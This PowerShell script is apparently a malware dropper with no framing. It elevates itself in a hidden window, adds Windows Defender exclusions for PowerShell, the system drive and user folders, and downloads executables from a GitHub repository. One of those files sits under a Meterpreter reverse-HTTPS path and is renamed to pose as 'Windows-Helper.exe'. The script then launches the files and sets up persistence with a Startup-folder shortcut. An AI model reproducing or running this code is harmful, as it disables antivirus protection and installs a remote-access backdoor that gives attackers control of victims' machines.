

$drive = (Get-CimInstance -ClassName CIM_OperatingSystem).SystemDrive



if ((Test-Path -Path "$drive\Users\Public\Windows-Helper.exe" -PathType Leaf) -and (Test-Path -Path "$drive\Users\Public\persistent.exe" -PathType Leaf) -and (Test-Path -Path "$drive\Users\Public\gui.exe" -PathType Leaf)) {
    Write-Host "[+] All files present"
    Start-Process "$drive\Users\Public\gui.exe"
    Add-MpPreference -ExclusionPath "$($drive)\" -ErrorAction SilentlyContinue
} else {
    Write-Host "[+] Some files missing"
    
    param([switch]$Elevated)

    function Test-Admin {
        $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
        $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    }

    if ((Test-Admin) -eq $false)  { 
        if ($elevated) {
        } else {
            Start-Process powershell.exe -Verb RunAs -ArgumentList ('-ExecutionPolicy ByPass -WindowStyle hidden -noprofile -noexit -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
        }
        exit 
    }

    Add-MpPreference -ExclusionProcess "powershell.exe"
    Add-MpPreference -ExclusionPath "$drive\Users\Public"
    Add-MpPreference -ExclusionPath "$drive\Users\Public\Windows-Helper.exe"
    Add-MpPreference -ExclusionPath "$($drive)\" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$drive\Users\$([Environment]::UserName)\AppData\Local\Temp"
    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/gui.exe?raw=true" -outfile "$drive\Users\Public\gui.exe"
    powershell Add-MpPreference -ExclusionPath "$drive\Users\Public\gui.exe"
    cd $drive\Users\Public\
    Start-Process gui.exe
    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/reverse_https_1.exe?raw=true" -outfile "$drive\Users\Public\Windows-Helper.exe"
    Invoke-WebRequest -Uri "https://github.com/durandlh/mpr-cracker-remote/blob/main/fourth-revision/https_meterpreter/persistent.exe?raw=true" -outfile "$drive\Users\Public\persistent.exe"
    powershell Add-MpPreference -ExclusionPath "C:\Users\Public\persistent.exe"
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$drive\Users\$([Environment]::UserName)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-helper.lnk")
    $Shortcut.TargetPath = "$drive\Users\Public\persistent.exe"
    $Shortcut.Save()
    Start-Process "$drive\Users\Public\persistent.exe"
    Start-Sleep -Seconds 5

}







